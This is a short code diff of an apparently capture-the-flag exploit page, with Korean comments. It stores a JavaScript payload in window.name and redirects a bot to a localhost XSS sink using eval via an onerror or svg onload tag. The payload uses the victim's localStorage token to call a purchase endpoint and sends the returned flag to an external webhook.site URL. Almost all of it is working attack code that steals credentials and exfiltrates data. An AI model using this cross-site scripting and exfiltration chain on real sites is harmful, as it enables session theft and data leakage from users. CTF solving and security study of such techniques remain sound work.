@@ -1,21 +1,19 @@
 <script>
-    // 1. 봇이 실행할 실제 공격 코드 (플래그 구매 및 전송)
-    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12"; // Webhook.site 주소
+    // 1. 봇이 localhost 안에서 실행할 진짜 공격 코드
+    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
     const payload = `
         fetch('/4/buy', {
             method: 'POST',
             headers: { 'token': localStorage.getItem('token') }
         })
         .then(r => r.json())
-        .then(d => fetch('${webhook}?flag=' + d.data))
-        .catch(e => fetch('${webhook}?error=' + e));
+        .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)));
     `;
 
-    // 2. window.name에 페이로드 저장 (도메인이 바뀌어도 유지됨)
+    // 2. window.name에 공격 코드를 담습니다.
     window.name = payload;
 
-    // 3. 다시 localhost의 XSS 취약 지점으로 리다이렉트
-    // SPA 특성상 URL의 # 뒤에 오는 값을 검증 없이 화면에 그리는 경우가 많습니다.
-    // 아래 경로는 일반적인 SPA의 XSS 패턴입니다.
-    location.href = "http://localhost:3000/#/item/<img src=x onerror=eval(window.name)>";
+    // 3. 다시 localhost의 XSS 취약 경로로 봇을 보냅니다.
+    // /debug/:data 경로는 22자 제한이 있으므로, <svg/onload=eval(name)> (22자)를 사용합니다.
+    location.href = "http://localhost:3000/debug/%3csvg%2fonload%3deval(name)%3e";
 </script>
